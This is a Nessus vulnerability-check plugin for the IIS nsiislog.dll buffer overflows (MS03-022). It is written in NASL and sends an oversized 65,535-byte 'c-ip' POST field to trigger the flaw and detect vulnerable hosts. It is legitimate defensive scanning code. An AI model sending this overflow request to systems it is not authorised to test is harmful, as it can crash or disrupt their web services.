# 
# (C) Tenable Network Security, Inc.
#

# Supercedes MS03-019


include("compat.inc");

if(description)
{
 script_id(11664);
 script_version ("$Revision: 1.22 $");
 script_cve_id("CVE-2003-0227", "CVE-2003-0349");
 script_bugtraq_id(7727, 8035);
 script_xref(name:"OSVDB", value:"2106");
 script_xref(name:"OSVDB", value:"4535");
 script_xref(name:"IAVA", value:"2003-t-0013");
 script_xref(name:"IAVA", value:"2003-t-0014");

 script_name(english:"Microsoft Media Services ISAPI nsiislog.dll Multiple Overflows");

 script_set_attribute(attribute:"synopsis", value:
"Arbitrary code can be executed on the remote host" );
 script_set_attribute(attribute:"description", value:
"Some versions of IIS shipped with a default file, nsiislog.dll, 
within the /scripts directory.  Nessus has determined that the
remote host has the file installed. 

The NSIISLOG.dll CGI may allow an attacker to execute
arbitrary commands on this host, through a buffer overflow." );
 script_set_attribute(attribute:"solution", value:
"http://www.microsoft.com/technet/security/bulletin/ms03-022.mspx" );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C" );

script_end_attributes();

 
 script_summary(english:"Determines the presence of nsiislog.dll");
 script_category(ACT_DENIAL);
 script_copyright(english:"This script is Copyright (C) 2003-2009 Tenable Network Security, Inc.");
 script_family(english:"Web Servers");
 script_dependencie("find_service1.nasl", "http_version.nasl", "www_fingerprinting_hmap.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

sig = get_kb_item("www/hmap/" + port + "/description");
if ( sig && "IIS" >!< sig ) exit(0);

req  = http_get(item:"/scripts/nsiislog.dll", port:port);
res  = http_keepalive_send_recv(port:port, data:req);
if("NetShow ISAPI Log Dll" >< res)
{
  all = make_list("date", "time", "c-dns", "cs-uri-stem", "c-starttime", 
  		  "x-duration", "c-rate", "c-status", "c-playerid",
		  "c-playerversion", "c-player-language", "cs(User-Agent)",
		  "cs(Referer)", "c-hostexe");
		  
  poison = NULL;
  
  foreach var (all)
  {
   poison += var + "=Nessus&";
  }		 
   
  poison += "c-ip=" + crap(65535);
  
  req = string("POST /scripts/nsiislog.dll HTTP/1.1\r\n",
"Host: ", get_host_name(), "\r\n",
"User-Agent: NSPlayer/2.0\r\n",
"Content-Type: application/x-www-form-urlencoded\r\n",
"Content-Length: ", strlen(poison), "\r\n\r\n") + poison;

 soc = http_open_socket(port);
 if(!soc)exit(0);
 send(socket:soc, data:req);
 r = http_recv(socket:soc);

 # 2nd match fails on localized Windows
 if("HTTP/1.1 500 Server Error" >< r && "The remote procedure call failed. " >< r ) security_hole(port);
}
